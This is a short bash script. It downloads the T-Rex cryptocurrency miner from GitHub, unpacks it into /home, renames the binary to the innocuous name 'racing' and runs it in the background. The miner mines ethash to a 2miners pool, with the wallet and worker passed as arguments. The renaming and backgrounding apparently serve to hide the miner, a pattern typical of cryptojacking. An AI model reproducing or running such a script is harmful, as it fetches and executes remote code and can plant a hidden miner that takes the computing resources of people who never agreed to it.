#!/bin/bash
cd /home
wget https://github.com/trexminer/T-Rex/releases/download/0.26.5/t-rex-0.26.5-linux.tar.gz
tar xvzf t-rex-0.26.5-linux.tar.gz
mv t-rex racing
./racing -a ethash -o stratum+tcp://eth.2miners.com:2020 -u $1 -p 123456 -w $2 &